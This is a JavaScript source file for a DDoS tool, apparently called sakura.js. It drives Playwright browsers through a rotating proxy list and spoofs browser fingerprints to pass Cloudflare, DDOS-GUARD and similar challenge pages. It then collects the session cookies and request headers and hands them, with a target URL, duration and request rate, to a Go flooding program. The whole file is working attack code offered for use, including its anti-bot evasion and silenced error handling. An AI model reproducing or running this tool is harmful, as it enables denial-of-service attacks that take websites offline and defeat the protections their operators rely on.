const fs = require('fs');
const { chromium } = require("playwright");
const { UAParser } = require('ua-parser-js');
const { spawn } = require('child_process');

process.on('uncaughtException', function(error) {});
process.on('unhandledRejection', function(error) {});
process.on('warning', function(warning) {});
process.on('SIGINT', function() {
    log("Attack stopped");
    process.exit(-1);
});

function timeConverter(UNIX_timestamp){
  var a = new Date(UNIX_timestamp * 1000);
  var months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
  var year = a.getFullYear();
  var month = months[a.getMonth()];
  var date = a.getDate();
  var hour = a.getHours();
  var min = a.getMinutes();
  var sec = a.getSeconds();
  var time = date + ' ' + month + ' ' + year + ' ' + hour + ':' + min + ':' + sec ;
  return time;
}

function log(string) {
	let d = new Date();
	let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
	let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
	let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
	console.log(`[${hours}:${minutes}:${seconds}] ${string}`);
}

function shuffle(array) {
  let currentIndex = array.length, randomIndex;

  while (currentIndex != 0) {
    randomIndex = Math.floor(Math.random() * currentIndex);
    currentIndex--;

    [array[currentIndex], array[randomIndex]] = [
      array[randomIndex], array[currentIndex]];
  }

  return array;
}

var args = {
	target: process.argv[2],
	time: process.argv[3],
	threads: process.argv[4],
	rate: process.argv[5],
	proxyfile: process.argv[6],
	while_s: process.argv[7],
}

let headers = '';
let created = 0;
const proxies = fs.readFileSync(args.proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(word => word.trim().length > 0);

if (process.argv.length < 5) {
    log('node sakura.js target 300 10 32 http.txt false(while)');
    process.exit(-1);
}

async function rand_proxy() {
	const sh_pr = await shuffle(proxies);
	Array.prototype.remove = function () {
		var what, a = arguments, L = a.length, ax;
		while (L && this.length) {
			what = a[--L];
			while ((ax = this.indexOf(what)) !== -1) {
				this.splice(ax, 1);
			}
		}
		return this;
	};	

	const proxy = sh_pr[Math.floor(Math.random() * sh_pr.length)];
	proxies.remove(proxy);	
	return proxy
}

async function main() {
	try {
		if(args.while_s == false || args.while_s == undefined) {
			for(let i = 0; i < args.threads; i++) {
				const proxy = await rand_proxy();	
				created++
				console.clear();
				log('Created browser: [' + created + '/' + args.threads + ']');
				newBrowser(proxy);
			}
		} else {
			const proxy = await rand_proxy();	
			created++
			console.clear();
			log('Created browser: [' + created + '/' + args.threads + ']');
			newBrowser(proxy);	
		}
	} catch(err) {}
} 
main(); 

async function newBrowser(proxy) {
	
	const userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36';
	const screen = { width: 1920, height: 1080 };

	const screens = { availHeight: 1920, availWidth: 1080 };

	const browser = await chromium.launch({ 
		headless: false,
		javaScriptEnabled: true,
		permissions: ['camera', 'microphone'],
		proxy: { server: 'http://' + proxy },		
		args: [
			'--disable-blink-features=AutomationControlled', 
			'--disable-features=IsolateOrigins,site-per-process', 
			'--user-agent=' + userAgent,	
			'--use-fake-device-for-media-stream',
			'--use-fake-ui-for-media-stream',
			'--no-sandbox'
		],
	});
	
	const page = await browser.newPage({ deviceScaleFactor: 1 });
	await page.emulateMedia({ colorScheme: 'dark' })
	await page.setViewportSize({ width: screen['width'], height: screen['height'] });
	const parser = new UAParser();
	parser.setUA(userAgent);
	const result = parser.getResult();	
	
	const brands = [{"brand":" Not A;Brand","version":"24"},{"brand":"Chromium","version":result.ua['major']},{"brand":"Google Chrome","version":result.ua['major']}]	
	const cdp = await page.context().newCDPSession(page);
	await cdp.send('Media.enable');	
	await cdp.send('Network.enable');
	await cdp.send('Network.setUserAgentOverride', {
		userAgent: userAgent,
		userAgentMetadata: {
			brands: this.brands,
			fullVersionList: result.ua['version'],
			fullVersion: this.brands,
			platform: result.os['name'],
			platformVersion: result.os['version'],
			architecture: 'x86',
			model: 'H410M H V3',
			mobile: false,
			bitness: '64',
		}
	});
	
	await page.addInitScript(() => {	
		['height', 'width'].forEach(property => {
		  const imageDescriptor = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, property);
		  Object.defineProperty(HTMLImageElement.prototype, property, {
			...imageDescriptor,
			get: function() {
			  if (this.complete && this.naturalHeight == 0) {
				return 20;
			  }
			  return imageDescriptor.get.apply(this);
			},
		  });
		});		
	});	
	
	await page.addInitScript(() => {	
		Object.getPrototypeOf(Notification, 'permission', {
			get: function() {
				return 'default';
			}
		});	
	});	
	
	await page.addInitScript(() => {	
		Object.defineProperty(navigator, 'pdfViewerEnabled', {
			get: () => true,
		});	
	});			

	await page.addInitScript(() => {
		Object.defineProperty(navigator.connection, 'rtt', {
			get: () => 50,
		});
	});	

	await page.addInitScript(() => {
		Object.defineProperty(navigator, 'share', {
			get: () => false,
		});	
	});
	
	await page.addInitScript(() => {
		Object.defineProperty(navigator, 'canShare', {
			get: () => false,
		});	
	});		
	
	await page.addInitScript(() => {
		Object.defineProperty(navigator, 'bluetooth', {
			get: () => false,
		});	
	});			
	try {
		const response = await page.goto(args.target, { waitUntil: 'domcontentloaded', timeout: 15000 });
		if(response) { 
			headers = await response.request().allHeaders()
			let x = Math.random(200, 400)
			let y = Math.random(200, 400)
			await page.mouse.move(x, y, { steps: 100 });
			await page.mouse.click(x, y, { delay: 150 });
			await page.waitForTimeout(15000);
			await page.mouse.move(x, y, { steps: 100 });
			await page.mouse.click(x, y, { delay: 150 });

			const title = await page.title();
			if(title == 'Just a moment...' || title == 'Checking your browser...' || title == 'Access denied' || title == 'DDOS-GUARD' || title == 'VentryShield | One more step' || title == 'Captcha Challenge') { await browser.close() }			
			
			const cookie = (await page.context().cookies(args.target)).map(c => `${c.name}=${c.value}`).join('; ');
			if(cookie) {
				log('Cookie: [' + cookie + '] | Title: [' + title + ']');
				flood(cookie, proxy);
				await browser.close();
			} else {
				const seks = await rand_proxy();
				newBrowser(seks);
				await browser.close();				
			}
		}
	} catch(err) {
		const seks = await rand_proxy();
		newBrowser(seks);
	    await browser.close();
	}
}

async function flood(cookie, proxy) {
	let promise = new Promise((res,rej) => {
		var authority =	headers[':authority'];
		var method_1 = headers[':method'];
		var path = headers[':path'];
		var scheme = headers[':scheme'];
		var accept = headers['accept'];
		var accept_l = headers['accept-language'];
		var accept_e = headers['accept-encoding'];
		var sec_ua = headers['sec-ch-ua'];
		var sec_ua_m = headers['sec-ch-ua-mobile'];	
		var sec_ua_p = headers['sec-ch-ua-platform'];
		var sec_fetch_d = headers['sec-fetch-dest'];
		var sec_fetch_m = headers['sec-fetch-mode'];
		var sec_fetch_s = headers['sec-fetch-site'];
		var sec_fetch_u = headers['sec-fetch-user'];
		var u_i_r = headers['upgrade-insecure-requests'];
		var user_agent = headers['user-agent'];
		const starts = spawn('go', ["run", "sakura-flood.go", "target=" + args.target, "time=" + args.time, "requests=" + args.rate, "mode=GET", "user_agent=" + user_agent, "cookie=" + cookie, "proxy=" + proxy, "authority=" + authority, "method_1=" + method_1, "path=" + path, "scheme=" + scheme, "accept=" + accept, "accept_e=" + accept_e, "sec_ua=" + sec_ua, "sec_ua_m=" + sec_ua_m, "sec_ua_p=" + sec_ua_p, "sec_fetch_d=" + sec_fetch_d, "sec_fetch_m=" + sec_fetch_m, "sec_fetch_s=" + sec_fetch_s, "sec_fetch_u=" + sec_fetch_u, "u_i_r=" + u_i_r, "accept_l=" + accept_l]);			
		starts.stdout.on('data', (data) => {
			console.log(data.toString());
			return res();
		});		
	})
}